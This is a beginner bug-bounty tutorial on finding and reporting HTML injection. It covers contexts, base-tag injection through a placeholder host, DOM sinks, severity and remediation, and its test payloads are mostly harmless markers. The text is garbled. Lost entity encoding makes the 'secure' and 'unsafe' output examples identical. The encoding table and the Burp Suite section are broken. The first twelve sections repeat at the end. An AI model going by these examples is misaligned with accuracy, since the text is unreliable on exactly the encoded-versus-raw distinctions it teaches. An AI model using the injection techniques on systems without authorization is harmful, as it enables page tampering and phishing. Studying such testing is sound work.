docs.title: 1. What Is HTML Injection?
docs.text:
HTML Injection happens when an application takes attacker-controlled input and places it into an HTML page without properly encoding or sanitizing it.

The browser then interprets the injected input as HTML instead of treating it as normal text.

For example, imagine a website contains:

<h1>Welcome, USERNAME</h1>

The application expects:

Welcome, Ahmed

But an attacker supplies:

<b>Injected</b>

The server might generate:

<h1>Welcome, <b>Injected</b></h1>

The browser renders:

docs.title: Welcome, Injected
docs.text:
The important point is:

The attacker did not simply change text. They changed the structure of the HTML document.

OWASP describes HTML Injection as the ability to control an input point and inject arbitrary HTML into a vulnerable web page.

Invicti similarly describes HTML Injection as arbitrary HTML markup being inserted into legitimate application HTML.

docs.title: 2. HTML Basics You Need Before Testing
docs.text:
You do not need to become an HTML expert before hunting HTML Injection.

You should understand:

<tag>content</tag>

Examples:

<p>Hello</p>
<h1>Hello</h1>
<b>Hello</b>
<i>Hello</i>
<div>Hello</div>
<a href="/profile">Profile</a>
<img src="/image.png">

HTML elements can also contain attributes:

<a href="/profile" class="button">Profile</a>

Here:

a       = tag
href    = attribute
/profile = attribute value

Another example:

<input type="text" value="Ahmed">

The value is inside an HTML attribute.

This distinction is extremely important for bug hunting.

docs.title: 3. How HTML Injection Happens
docs.text:
The basic vulnerability looks like this:

Attacker Input
      |
      v
Application
      |
      v
HTML Response
      |
      v
Browser
      |
      v
Injected HTML

For example:

GET /search?q=hello

Application:

<h2>Search results for: hello</h2>

Now test:

GET /search?q=<b>TEST</b>

If the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as HTML.

If instead the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is treating it as text.

That distinction is the foundation of HTML Injection testing.

docs.title: 4. HTML Injection vs XSS
docs.text:
This is one of the most important concepts for a beginner.

HTML Injection and XSS are closely related, but they are not automatically the same finding.

docs.title: HTML Injection
docs.text:
The attacker can inject HTML:

<b>Injected text</b>

but cannot execute attacker-controlled JavaScript.

docs.title: XSS
docs.text:
The attacker can execute JavaScript in the victim's browser.

For example, conceptually:

<script>...</script>

or another scriptable HTML context.

OWASP and CWE treat XSS as a broader weakness involving improper neutralization of untrusted input during web-page generation. CWE-79 explicitly discusses HTML body, attributes, URLs, JavaScript, CSS, and other contexts.

Invicti notes that HTML Injection is generally more limited than XSS because pure HTML does not inherently provide the same scripting capabilities.

docs.title: Important Bug Bounty Rule
docs.text:
Do not automatically report:

HTML reflected

as:

Stored XSS

or:

Reflected XSS

unless you actually demonstrate script execution or another accepted XSS condition.

docs.title: 5. Types of HTML Injection
docs.text: There are three useful categories to understand.

docs.title: 5.1 Reflected HTML Injection
docs.text:
The payload comes from the request and is immediately reflected.

Example:

/search?q=<b>TEST</b>

Response:

<h1>Results for <b>TEST</b></h1>

The payload is not permanently stored.

Invicti describes reflected HTML Injection as malicious HTML being reflected from request input into the response.

docs.title: 5.2 Stored HTML Injection
docs.text:
The application stores attacker-controlled HTML and displays it later.

Example:

Username:
<b>HACKED</b>

The application stores it.

Later:

Welcome <b>HACKED</b>

Every user viewing the affected page may see the injected content.

Possible locations include:

  • comments
  • profiles
  • usernames
  • display names
  • posts
  • tickets
  • support messages
  • project names
  • organization names
  • document titles
  • notifications
  • chat messages
  • custom fields

Stored injection can therefore have a much larger audience than a reflected issue.

docs.title: 5.3 DOM-Based HTML Injection
docs.text:
The server may never receive the malicious input.

Instead, JavaScript takes attacker-controlled data and writes it into the DOM unsafely.

Example:

const value = location.hash.substring(1);

document.getElementById("output").innerHTML = value;

An attacker-controlled fragment can then become HTML.

OWASP specifically identifies dangerous DOM sinks such as:

innerHTML
document.write()

when they process untrusted input.

docs.title: 6. Understanding HTML Contexts
docs.text:
Before creating a payload, always ask:

Where exactly does my input appear in the HTML response?

This is probably the most important skill in HTML/XSS testing.

Your input could appear in:

docs.title: HTML body
docs.text: <div>YOUR_INPUT</div>

docs.title: Attribute
docs.text: <input value="YOUR_INPUT">

docs.title: Link
docs.text: <a href="YOUR_INPUT">

docs.title: Image
docs.text: <img src="YOUR_INPUT">

docs.title: JavaScript
docs.text:
<script>
let value = "YOUR_INPUT";
</script>

docs.title: CSS
docs.text:
<style>
.example {
    background: YOUR_INPUT;
}
</style>

Each context behaves differently.

PortSwigger emphasizes that identifying the exact injection context is a fundamental part of testing reflected and stored XSS because the context determines which payloads can work.

docs.title: 7. Where to Look for HTML Injection
docs.text: As a beginner, start with anything that accepts user-controlled data.

docs.title: Common inputs
docs.text:
Look at:

Search
Username
Display name
First name
Last name
Company name
Project name
Team name
Comment
Description
Bio
Address
Message
Ticket title
Ticket body
File name
Document name
Product name
Category
Tag
Notification text

Also inspect:

Query parameters
Path parameters
POST parameters
JSON fields
Multipart fields
HTTP headers
Cookies
URL fragments
WebSocket messages
GraphQL variables
API requests

Do not assume that only visible form fields matter.

An API may accept:

{
  "fullname": "..."
}

and later render that value in another part of the application.

docs.title: 8. First Detection Method
docs.text:
Start with a harmless marker.

Use something unique:

HTMLTEST123

Submit it.

Then search for:

HTMLTEST123

in:

  • response body
  • rendered page
  • DOM
  • page source

If reflected, determine exactly where.

Next, test whether HTML is interpreted.

A safe first payload:

<b>HTMLTEST123</b>

If rendered bold:

HTMLTEST123

you have evidence that HTML markup is being interpreted.

Another useful harmless test:

<i>HTMLTEST123</i>

or:

<h1>HTMLTEST123</h1>

The goal of the first phase is not exploitation.

The goal is:

Determine whether attacker-controlled input changes the HTML document structure.

Qualys specifically notes that merely finding your string in the response is not enough; a scanner should determine whether the input actually changes the document structure or causes browser-relevant behavior.

docs.title: 9. Safe HTML Injection Payloads
docs.text: Start simple.

docs.title: Basic text formatting
docs.text:
<b>TEST</b>

<i>TEST</i>

<h1>TEST</h1>

<u>TEST</u>

<mark>TEST</mark>

docs.title: Element creation
docs.text:
<div>TEST</div>

<p>TEST</p>

<span>TEST</span>

docs.title: Link creation
docs.text: <a href="/test">TEST</a>

docs.title: Image element
docs.text:
<img src="/test.png">

These payloads are useful because they help determine what the application permits without immediately moving into JavaScript execution.

Qualys points out that even successfully creating an otherwise meaningless HTML element can demonstrate that input is not being handled securely.

docs.title: 10. Testing HTML Body Context
docs.text:
Suppose you find:

<div>
    SEARCH_VALUE
</div>

Your input:

HTMLTEST

becomes:

<div>
    HTMLTEST
</div>

Now try:

<b>HTMLTEST</b>

If the browser displays:

HTMLTEST

you have confirmed HTML interpretation.

Try:

<h1>HTMLTEST</h1>

If the page layout changes because an <h1> element was created, that is stronger evidence.

docs.title: What you should record
docs.text:
Document:

Input:
<b>HTMLTEST</b>

Expected:
<b>HTMLTEST</b> displayed literally.

Actual:
The browser rendered HTMLTEST as bold text.

docs.title: 11. Testing Attribute Context
docs.text:
Now imagine:

<input value="YOUR_INPUT">

Your input is inside an attribute.

If you submit:

HTMLTEST

the browser sees:

<input value="HTMLTEST">

Try determining whether quotation marks are correctly handled.

For example:

TEST"TEST

Look at the resulting HTML.

Secure output might be:

<input value="TEST"TEST">

Potentially unsafe output could resemble:

<input value="TEST"TEST">

The second case suggests that the attacker may be able to alter the HTML structure.

PortSwigger describes this exact concept: when input lands inside an attribute value, the tester needs to understand whether the value can be terminated and whether additional markup/attributes can then be introduced.

docs.title: 12. Breaking Out of Quoted Attributes
docs.text:
Suppose the application generates:

<input type="text" value="USER_INPUT">

The intended structure is:

value="USER_INPUT"

The important characters are:

"

because the quote terminates the attribute.

A controlled test could be:

TEST"TEST

Then inspect:

<input type="text" value="TEST"TEST">

If the quote is not encoded, the application may be allowing structural HTML manipulation.

This does not automatically mean XSS.

You have established an attribute injection condition.

The next step is to determine what impact that context allows.

docs.title: 13. Testing Links and URLs
docs.text:
A common context is:

<a href="USER_INPUT">Click</a>

or:

<link href="USER_INPUT">

or:

<img src="USER_INPUT">

Test with harmless URLs first.

Example:

https://example.com/

Then compare:

javascript:

and other schemes only on authorized targets and where the testing program permits such testing.

The important concept is that URL-valued attributes are not equivalent to normal text attributes.

PortSwigger notes that URL attributes can themselves create scriptable contexts and therefore require context-specific handling.

docs.title: 14. Testing Form Injection
docs.text:
Forms deserve special attention.

Suppose a page contains:

<form action="/login" method="POST">
    <input name="username">
    <input name="password">
</form>

If an attacker can inject HTML before or around the form, the resulting document structure may behave differently.

A particularly important concept is:

<form>

elements.

HTML parsing rules do not allow forms to behave like ordinary nested containers.

Therefore, malformed or injected form markup can sometimes change which controls belong to which form.

This is why an HTML Injection finding involving forms can have greater impact than simple visual modification.

However:

Do not submit real credentials during testing.

Use dummy accounts and dummy data.

docs.title: 15. Base Tag Injection
docs.text:
One of the most interesting HTML Injection variants is:

<base>

The <base> element establishes the base URL used to resolve relative URLs in a document.

For example:

<base href="https://example.com/">

Consider:

<script src="/static/app.js"></script>

With the appropriate base URL, relative references are resolved against that base.

Punk Security describes Base Tag Injection as a lesser-known HTML Injection technique where an attacker-controlled <base> element changes how relative URLs in the document are resolved.

docs.title: 16. Relative URLs and Why <base> Matters
docs.text:
Suppose a page contains:

<img src="/images/logo.png">

and:

<script src="/static/app.js"></script>

and:

<a href="/account">Account</a>

Relative references depend on a base URL.

If an attacker can introduce:

<base href="https://controlled.example/">

then subsequent relative references may resolve against that origin.

Conceptually:

/static/app.js

could resolve as:

https://controlled.example/static/app.js

depending on the document and URL structure.

This is why Base Tag Injection can be much more interesting than simply injecting:

<b>TEST</b>

Punk Security documents possible effects on scripts, stylesheets, links, and images.

docs.title: Testing for Base Tag Injection
docs.text:
First determine whether:

<base>

is accepted.

Use a harmless base pointing to infrastructure you control or a test domain authorized by the program.

Example:

<base href="https://controlled.example/">

Then inspect the DOM and browser network requests.

You are looking for:

Relative URL
      ↓
Unexpected base
      ↓
Unexpected destination

Do not use this technique to collect real credentials, authentication tokens, or other users' information.

docs.title: CSP Defense
docs.text:
A useful defense is:

Content-Security-Policy: base-uri 'self'

or, depending on the application's architecture:

Content-Security-Policy: base-uri 'none'

Punk Security specifically highlights the CSP base-uri directive as a defense against Base Tag Injection.

Invicti also notes that CSP can mitigate some Base Tag Injection scenarios but should not be treated as a complete defense against HTML Injection.

docs.title: 17. DOM-Based HTML Injection
docs.text:
DOM-based HTML Injection occurs when JavaScript takes attacker-controlled data and inserts it into an HTML sink.

Dangerous examples include:

element.innerHTML = userInput;

document.write(userInput);

document.writeln(userInput);

OWASP specifically identifies innerHTML and document.write() as potentially dangerous when untrusted data is used without appropriate protection.

docs.title: Example
docs.text:
Vulnerable:

const name = location.search.substring(6);

document.getElementById("welcome").innerHTML =
    "Hello " + name;

Request:

?page?name=<b>TEST</b>

Potential result:

<div id="welcome">
    Hello <b>TEST</b>
</div>

The server does not necessarily need to reflect the value.

The browser-side JavaScript creates the vulnerability.

docs.title: 18. Stored HTML Injection
docs.text:
Stored injection deserves special attention in bug bounty programs.

Typical flow:

Attacker
   |
   v
Input
   |
   v
Application
   |
   v
Database
   |
   v
Victim visits page
   |
   v
Injected HTML rendered

Examples:

Profile name
Comment
Project description
Support ticket
Organization name
Team name
Document title

docs.title: Step 1
docs.text:
Choose a harmless marker:

HTML-STORED-123

docs.title: Step 2
docs.text: Submit it.

docs.title: Step 3
docs.text: Navigate away.

docs.title: Step 4
docs.text: Return to the page.

docs.title: Step 5
docs.text: Check whether it remains.

docs.title: Step 6
docs.text:
Test harmless HTML:

<b>HTML-STORED-123</b>

docs.title: Step 7
docs.text:
Check whether another account sees it.

Only test cross-user behavior when explicitly permitted by the program.

docs.title: 19. Reflected HTML Injection
docs.text:
Reflected injection usually looks like:

GET /search?q=PAYLOAD

and:

<h2>Search results for PAYLOAD</h2>

The important characteristic is:

Request
  ↓
Server
  ↓
Response
  ↓
Browser

The payload is not necessarily stored.

docs.title: Reflected Injection Checklist
docs.text:
For every parameter:

Does my value appear in the response?
        |
        +-- No → probably not reflected here
        |
        +-- Yes
             |
             v
Where does it appear?
             |
             +-- HTML text
             +-- Attribute
             +-- URL
             +-- JavaScript
             +-- CSS

This workflow is far more useful than blindly trying payload lists.

docs.title: 20. HTML Injection Through APIs
docs.text:
Modern bug hunters should pay special attention to APIs.

Imagine:

PUT /api/profile
Content-Type: application/json

{
  "fullname": "<b>TEST</b>"
}

The API may respond:

{
  "success": true
}

This does not prove there is no vulnerability.

The value may be stored and later displayed:

Profile
Admin panel
Team members
Comments
Notifications
Email templates
Audit logs

Therefore:

Always follow data through the application.

A value that appears harmless in an API response may become dangerous when another frontend renders it.

docs.title: 21. HTML Injection in Modern Applications
docs.text:
Modern applications frequently use:

React
Vue
Angular
Svelte
Next.js
Nuxt
jQuery
Custom JavaScript
Server-side templates

Frameworks can provide automatic escaping, but developers can still introduce dangerous behavior.

Pay attention to:

innerHTML
outerHTML
insertAdjacentHTML
document.write

and framework-specific raw HTML features.

For example, React has mechanisms for intentionally rendering raw HTML.

The important question is not:

"Is this React?"

The important question is:

"Where does this value eventually become HTML?"

docs.text:
Burp Suite is extremely useful for HTML Injection testing.

A simple workflow:

Browser

docs.text:
For example:

docs.title: Step 2 — Send to Repeater

Browser behavior

docs.title: 23. Finding the Injection Context
docs.text:
This is the workflow I recommend for beginners.

Suppose your marker is:

INJECT123

You find:

<div class="result">
    INJECT123
</div>

Context:

HTML BODY

Now imagine:

<input value="INJECT123">

Context:

ATTRIBUTE

Another example:

<a href="/search?q=INJECT123">

Context:

URL ATTRIBUTE

Another:

<script>
const query = "INJECT123";
</script>

Context:

JAVASCRIPT

Do not use the same payload for every context.

docs.title: 24. Understanding Encoding
docs.text:
Encoding is one of the most important concepts in web security.

Suppose the application receives:

<b>TEST</b>

and outputs:

<b>TEST</b>

The browser displays:

<b>TEST</b>

as text.

The browser does not interpret it as a <b> element in that HTML text context.

OWASP recommends context-specific output encoding rather than applying one generic encoding strategy everywhere.

docs.title: 25. HTML Entity Encoding
docs.text:
Important characters include:

Character HTML Encoding & & < < > > " " ' '

For example:

<b>TEST</b>

becomes:

<b>TEST</b>

OWASP documents HTML entity encoding as the appropriate technique for values inserted into ordinary HTML contexts.

docs.title: 26. Filter and WAF Testing
docs.text:
Many beginner hunters make this mistake:

<script>...</script>

gets blocked.

They conclude:

Not vulnerable.

That is not necessarily correct.

A filter may block one pattern while allowing HTML Injection.

For example:

<script>

might be rejected while:

<b>TEST</b>

still works.

Qualys specifically discusses weak filters that look for obvious strings such as <script> or alert, while other HTML structures remain injectable.

docs.title: What to Test
docs.text:
Instead of testing only one payload, test categories:

Simple element
Attribute
Closing tag
Quote
HTML entity
URL
Form
Base

Your objective is to understand:

What characters are encoded?
What tags are allowed?
What attributes are allowed?
Is input transformed?
Is it stripped?
Is it stored?
Does the browser parse it differently?

docs.title: Mistake 1 — String concatenation
docs.text:
Example:

output.innerHTML = "<div>" + username + "</div>";

If username is untrusted, this can be dangerous.

docs.title: Mistake 2 — Trusting client-side validation
docs.text:
JavaScript may say:

Invalid characters!

But the server might accept them directly.

Always test the actual HTTP request.

docs.title: Mistake 3 — Blacklisting <script>
docs.text:
Blocking:

<script>

does not solve HTML Injection.

HTML contains hundreds of elements and attributes.

docs.title: Mistake 4 — Encoding only some characters
docs.text:
For example:

< encoded
> encoded
" not encoded

An attribute context may still be vulnerable.

docs.title: Mistake 5 — Encoding too early
docs.text:
Encoding should be appropriate for the final output context.

OWASP and PortSwigger both emphasize context-specific output encoding.

docs.title: 28. Impact Assessment
docs.text: HTML Injection can have different impacts.

docs.title: Low-impact example
docs.text:
<b>Injected</b>

Only changes visual formatting.

docs.title: Higher-impact example
docs.text:
Stored HTML changes a public page:

Defacement
False content
Fake announcements

docs.title: Higher-impact example
docs.text:
An attacker can inject:

<form>

and create a convincing fake interface.

docs.title: Higher-impact example
docs.text: Base Tag Injection changes where relative resources resolve.

docs.title: Potential escalation
docs.text:
HTML Injection can sometimes become:

HTML Injection
      ↓
DOM manipulation
      ↓
Resource loading
      ↓
Script execution
      ↓
XSS

But you must prove each step.

Do not automatically claim the highest possible impact.

docs.title: 29. When HTML Injection Becomes XSS
docs.text:
This distinction matters greatly in bug bounty reports.

Suppose:

<b>TEST</b>

works.

That proves:

HTML Injection

It does not automatically prove:

XSS

If you discover that the same injection context allows attacker-controlled JavaScript execution, then the vulnerability should generally be evaluated as XSS rather than merely HTML Injection.

PortSwigger's XSS testing material demonstrates why the exact context determines whether a markup injection can progress into script execution.

docs.title: 30. HTML Injection and CSRF
docs.text:
HTML Injection can sometimes interact with CSRF protections.

For example, applications often place CSRF tokens inside forms:

<input
    type="hidden"
    name="csrf"
    value="TOKEN">

If HTML Injection allows an attacker to manipulate the form structure, the security assumptions around that form may change.

Invicti documents scenarios where HTML Injection can potentially expose CSRF tokens or facilitate CSRF-related attacks.

However:

Do not claim "CSRF bypass" simply because HTML Injection exists.

You need to demonstrate the actual security boundary being bypassed.

docs.title: 31. HTML Injection and Password Managers
docs.text:
Modern browsers and password managers may interact with HTML forms.

If an attacker can create or manipulate a form on a trusted origin, browser autofill behavior can become relevant.

Invicti notes that injected forms can potentially interact with browser password managers depending on the browser, form structure, and autofill behavior.

For responsible testing:

Use test credentials.
Never collect real user passwords.
Never test against users you do not control.

docs.title: 32. HTML Injection and Phishing
docs.text:
HTML Injection can make an attacker-controlled interface appear inside a trusted origin.

For example:

https://target.example/account

could potentially display attacker-controlled HTML.

This matters because the browser address bar may still show:

target.example

even though the injected interface is controlled by the attacker.

Possible consequences include:

Fake login forms
Fake payment prompts
Fake password reset forms
Fake security warnings
Fake account notifications

Invicti and CDNetworks both identify phishing, page manipulation, and deceptive content as potential consequences.

docs.title: 33. How to Confirm a Real Vulnerability
docs.text: A good bug hunter should prove three things.

docs.title: 1. Input Control
docs.text:
Can you control the value?

Example:

?q=HTMLTEST

docs.title: 2. HTML Interpretation
docs.text:
Does the browser interpret your input as HTML?

Example:

<b>HTMLTEST</b>

renders as bold.

docs.title: 3. Security Impact
docs.text:
What can you actually accomplish?

Possible levels:

Visual modification
        ↓
HTML structure manipulation
        ↓
User interaction manipulation
        ↓
Form manipulation
        ↓
Resource manipulation
        ↓
Cross-user stored impact
        ↓
Potential XSS / other escalation

Report the highest impact you can demonstrate, not the highest impact you can imagine.

docs.title: 34. False Positives
docs.text:
Finding your payload in the response is not enough.

Example:

<div>
    <b>TEST</b>
</div>

This is probably just encoded text.

Another example:

<textarea>
<b>TEST</b>
</textarea>

The string exists in the response, but it is not necessarily parsed as an HTML element.

Another example:

<!-- <b>TEST</b> -->

Again, it is not being rendered as normal HTML.

Qualys explicitly warns that scanners cannot simply search for strings such as <script> or alert(); they need to determine whether the payload actually changes the document structure or produces exploitable browser behavior.

docs.title: 35. Bug Bounty Severity
docs.text:
Severity depends on context and impact.

Consider:

Situation Typical Impact Consideration Reflected visual HTML only Usually limited Stored visual HTML More significant Public page defacement Higher impact depending on audience HTML can manipulate forms Potentially significant HTML affects privileged users Potentially significant Base Tag Injection Context-dependent HTML Injection → XSS Report as XSS if proven HTML Injection → CSRF impact Depends on demonstrated bypass Credential phishing Depends on realistic victim exposure

Do not blindly assign:

Critical

because an HTML tag works.

Bug bounty programs have different severity standards.

Always read the program's policy.

docs.title: 36. Writing the Bug Report
docs.text:
A good report should be reproducible.

Use this structure:

# HTML Injection in [Parameter]

## Summary

The `[parameter]` parameter is vulnerable to HTML Injection.
Attacker-controlled HTML is rendered as markup in the affected page.

## Steps to Reproduce

1. Open [URL].
2. Navigate to [feature].
3. Submit the following value:

<b>HTMLTEST</b>

4. Observe that the value is rendered as HTML.
5. Inspect the resulting page.

## Payload

<b>HTMLTEST</b>

## Expected Result

User-controlled input should be rendered as text.

## Actual Result

The application renders the attacker-controlled input as HTML.

## Impact

An attacker can modify the rendered page content and potentially
manipulate the interface presented to users.

## Remediation

Apply context-appropriate output encoding and sanitize HTML only
where HTML is intentionally allowed.

docs.title: 37. Remediation
docs.text:
The primary defense is:

Treat untrusted data as data, not markup.

OWASP recommends context-specific output encoding, appropriate input validation, and safe DOM APIs.

docs.title: Unsafe
docs.text: element.innerHTML = username;

docs.title: Safer
docs.text:
element.textContent = username;

textContent treats the value as text rather than HTML.

OWASP specifically recommends safe sinks such as textContent when HTML is not intentionally required.

docs.title: Server-Side Example
docs.text:
Instead of:

<div>{{ user_input }}</div>

where the template engine may allow raw HTML, use the framework's normal escaped output mechanism.

Modern frameworks frequently provide automatic escaping.

The important rule is:

Do not disable automatic escaping unless you actually need to render trusted/sanitized HTML.

docs.title: 39. HTML Sanitization
docs.text:
Sometimes an application genuinely needs users to submit HTML.

Examples:

Rich-text editor
Blog editor
Documentation editor
Markdown renderer
Email template editor

In those situations, simply escaping everything may break the application's functionality.

Instead, use a mature HTML sanitizer with an allowlist.

For example:

Allowed tags:
p
b
i
strong
em
ul
ol
li

Potentially forbidden:

script
iframe
object
embed
base
event-handler attributes
dangerous URL schemes

The exact policy depends on the application.

Do not write your own HTML sanitizer unless there is a very strong reason.

docs.title: 40. Content Security Policy
docs.text:
CSP is useful defense-in-depth.

Example:

Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    object-src 'none';
    base-uri 'self';

The:

base-uri

directive is particularly relevant to Base Tag Injection.

CSP should not be considered the primary fix for HTML Injection.

The correct approach remains:

Context-aware output encoding
+
Input validation
+
Sanitization when HTML is intentionally allowed
+
CSP as defense-in-depth

Invicti specifically warns against relying on CSP as a complete HTML Injection defense.

docs.text: Test whether you can introduce additional attributes.

docs.text:

innerHTML
outerHTML
insertAdjacentHTML
document.write
document.writeln

Then trace the data source.

Potential sources include:

location.search
location.hash
location.pathname
document.referrer
postMessage
localStorage
sessionStorage

The key is the complete data flow:

SOURCE → TRANSFORMATION → SINK

docs.title: The Most Important Lesson
docs.text:
If you are a beginner bug hunter, do not memorize hundreds of HTML Injection payloads.

Learn to answer these five questions:

1. Can I control the input?

2. Where exactly does my input appear?

3. Is the input encoded or interpreted as HTML?

4. Is the injection reflected, stored, or DOM-based?

5. What security impact can I actually demonstrate?

Once you can answer those five questions, HTML Injection becomes much easier to find.

The real skill is not:

"I know a payload."

The real skill is:

"I understand how the browser parses my input,
what context I am in, what the application does
to my input, and what security boundary I can affect."

That mindset is what allows a beginner bug hunter to move from simple:

<b>TEST</b>

to understanding complex cases involving attributes, forms, APIs, DOM manipulation, Base Tag Injection, stored data, and possible XSS escalation.

docs.title: 1. What Is HTML Injection?
docs.text:
HTML Injection happens when an application takes attacker-controlled input and places it into an HTML page without properly encoding or sanitizing it.

The browser then interprets the injected input as HTML instead of treating it as normal text.

For example, imagine a website contains:

<h1>Welcome, USERNAME</h1>

The application expects:

Welcome, Ahmed

But an attacker supplies:

<b>Injected</b>

The server might generate:

<h1>Welcome, <b>Injected</b></h1>

The browser renders:

docs.title: Welcome, Injected
docs.text:
The important point is:

The attacker did not simply change text. They changed the structure of the HTML document.

OWASP describes HTML Injection as the ability to control an input point and inject arbitrary HTML into a vulnerable web page.

Invicti similarly describes HTML Injection as arbitrary HTML markup being inserted into legitimate application HTML.

docs.title: 2. HTML Basics You Need Before Testing
docs.text:
You do not need to become an HTML expert before hunting HTML Injection.

You should understand:

<tag>content</tag>

Examples:

<p>Hello</p>
<h1>Hello</h1>
<b>Hello</b>
<i>Hello</i>
<div>Hello</div>
<a href="/profile">Profile</a>
<img src="/image.png">

HTML elements can also contain attributes:

<a href="/profile" class="button">Profile</a>

Here:

a       = tag
href    = attribute
/profile = attribute value

Another example:

<input type="text" value="Ahmed">

The value is inside an HTML attribute.

This distinction is extremely important for bug hunting.

docs.title: 3. How HTML Injection Happens
docs.text:
The basic vulnerability looks like this:

Attacker Input
      |
      v
Application
      |
      v
HTML Response
      |
      v
Browser
      |
      v
Injected HTML

For example:

GET /search?q=hello

Application:

<h2>Search results for: hello</h2>

Now test:

GET /search?q=<b>TEST</b>

If the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is interpreting attacker-controlled input as HTML.

If instead the response becomes:

<h2>Search results for: <b>TEST</b></h2>

the application is treating it as text.

That distinction is the foundation of HTML Injection testing.

docs.title: 4. HTML Injection vs XSS
docs.text:
This is one of the most important concepts for a beginner.

HTML Injection and XSS are closely related, but they are not automatically the same finding.

docs.title: HTML Injection
docs.text:
The attacker can inject HTML:

<b>Injected text</b>

but cannot execute attacker-controlled JavaScript.

docs.title: XSS
docs.text:
The attacker can execute JavaScript in the victim's browser.

For example, conceptually:

<script>...</script>

or another scriptable HTML context.

OWASP and CWE treat XSS as a broader weakness involving improper neutralization of untrusted input during web-page generation. CWE-79 explicitly discusses HTML body, attributes, URLs, JavaScript, CSS, and other contexts.

Invicti notes that HTML Injection is generally more limited than XSS because pure HTML does not inherently provide the same scripting capabilities.

docs.title: Important Bug Bounty Rule
docs.text:
Do not automatically report:

HTML reflected

as:

Stored XSS

or:

Reflected XSS

unless you actually demonstrate script execution or another accepted XSS condition.

docs.title: 5. Types of HTML Injection
docs.text: There are three useful categories to understand.

docs.title: 5.1 Reflected HTML Injection
docs.text:
The payload comes from the request and is immediately reflected.

Example:

/search?q=<b>TEST</b>

Response:

<h1>Results for <b>TEST</b></h1>

The payload is not permanently stored.

Invicti describes reflected HTML Injection as malicious HTML being reflected from request input into the response.

docs.title: 5.2 Stored HTML Injection
docs.text:
The application stores attacker-controlled HTML and displays it later.

Example:

Username:
<b>HACKED</b>

The application stores it.

Later:

Welcome <b>HACKED</b>

Every user viewing the affected page may see the injected content.

Possible locations include:

  • comments
  • profiles
  • usernames
  • display names
  • posts
  • tickets
  • support messages
  • project names
  • organization names
  • document titles
  • notifications
  • chat messages
  • custom fields

Stored injection can therefore have a much larger audience than a reflected issue.

docs.title: 5.3 DOM-Based HTML Injection
docs.text:
The server may never receive the malicious input.

Instead, JavaScript takes attacker-controlled data and writes it into the DOM unsafely.

Example:

const value = location.hash.substring(1);

document.getElementById("output").innerHTML = value;

An attacker-controlled fragment can then become HTML.

OWASP specifically identifies dangerous DOM sinks such as:

innerHTML
document.write()

when they process untrusted input.

docs.title: 6. Understanding HTML Contexts
docs.text:
Before creating a payload, always ask:

Where exactly does my input appear in the HTML response?

This is probably the most important skill in HTML/XSS testing.

Your input could appear in:

docs.title: HTML body
docs.text: <div>YOUR_INPUT</div>

docs.title: Attribute
docs.text: <input value="YOUR_INPUT">

docs.title: Link
docs.text: <a href="YOUR_INPUT">

docs.title: Image
docs.text: <img src="YOUR_INPUT">

docs.title: JavaScript
docs.text:
<script>
let value = "YOUR_INPUT";
</script>

docs.title: CSS
docs.text:
<style>
.example {
    background: YOUR_INPUT;
}
</style>

Each context behaves differently.

PortSwigger emphasizes that identifying the exact injection context is a fundamental part of testing reflected and stored XSS because the context determines which payloads can work.

docs.title: 7. Where to Look for HTML Injection
docs.text: As a beginner, start with anything that accepts user-controlled data.

docs.title: Common inputs
docs.text:
Look at:

Search
Username
Display name
First name
Last name
Company name
Project name
Team name
Comment
Description
Bio
Address
Message
Ticket title
Ticket body
File name
Document name
Product name
Category
Tag
Notification text

Also inspect:

Query parameters
Path parameters
POST parameters
JSON fields
Multipart fields
HTTP headers
Cookies
URL fragments
WebSocket messages
GraphQL variables
API requests

Do not assume that only visible form fields matter.

An API may accept:

{
  "fullname": "..."
}

and later render that value in another part of the application.

docs.title: 8. First Detection Method
docs.text:
Start with a harmless marker.

Use something unique:

HTMLTEST123

Submit it.

Then search for:

HTMLTEST123

in:

  • response body
  • rendered page
  • DOM
  • page source

If reflected, determine exactly where.

Next, test whether HTML is interpreted.

A safe first payload:

<b>HTMLTEST123</b>

If rendered bold:

HTMLTEST123

you have evidence that HTML markup is being interpreted.

Another useful harmless test:

<i>HTMLTEST123</i>

or:

<h1>HTMLTEST123</h1>

The goal of the first phase is not exploitation.

The goal is:

Determine whether attacker-controlled input changes the HTML document structure.

Qualys specifically notes that merely finding your string in the response is not enough; a scanner should determine whether the input actually changes the document structure or causes browser-relevant behavior.

docs.title: 9. Safe HTML Injection Payloads
docs.text: Start simple.

docs.title: Basic text formatting
docs.text:
<b>TEST</b>

<i>TEST</i>

<h1>TEST</h1>

<u>TEST</u>

<mark>TEST</mark>

docs.title: Element creation
docs.text:
<div>TEST</div>

<p>TEST</p>

<span>TEST</span>

docs.title: Link creation
docs.text: <a href="/test">TEST</a>

docs.title: Image element
docs.text:
<img src="/test.png">

These payloads are useful because they help determine what the application permits without immediately moving into JavaScript execution.

Qualys points out that even successfully creating an otherwise meaningless HTML element can demonstrate that input is not being handled securely.

docs.title: 10. Testing HTML Body Context
docs.text:
Suppose you find:

<div>
    SEARCH_VALUE
</div>

Your input:

HTMLTEST

becomes:

<div>
    HTMLTEST
</div>

Now try:

<b>HTMLTEST</b>

If the browser displays:

HTMLTEST

you have confirmed HTML interpretation.

Try:

<h1>HTMLTEST</h1>

If the page layout changes because an <h1> element was created, that is stronger evidence.

docs.title: What you should record
docs.text:
Document:

Input:
<b>HTMLTEST</b>

Expected:
<b>HTMLTEST</b> displayed literally.

Actual:
The browser rendered HTMLTEST as bold text.

docs.title: 11. Testing Attribute Context
docs.text:
Now imagine:

<input value="YOUR_INPUT">

Your input is inside an attribute.

If you submit:

HTMLTEST

the browser sees:

<input value="HTMLTEST">

Try determining whether quotation marks are correctly handled.

For example:

TEST"TEST

Look at the resulting HTML.

Secure output might be:

<input value="TEST"TEST">

Potentially unsafe output could resemble:

<input value="TEST"TEST">

The second case suggests that the attacker may be able to alter the HTML structure.

PortSwigger describes this exact concept: when input lands inside an attribute value, the tester needs to understand whether the value can be terminated and whether additional markup/attributes can then be introduced.

docs.title: 12. Breaking Out of Quoted Attributes
docs.text:
Suppose the application generates:

<input type="text" value="USER_INPUT">

The intended structure is:

value="USER_INPUT"

The important characters are:

"

because the quote terminates the attribute.

A controlled test could be:

TEST"TEST

Then inspect:

<input type="text" value="TEST"TEST">

If the quote is not encoded, the application may be allowing structural HTML manipulation.

This does not automatically mean XSS.

You have established an attribute injection condition.

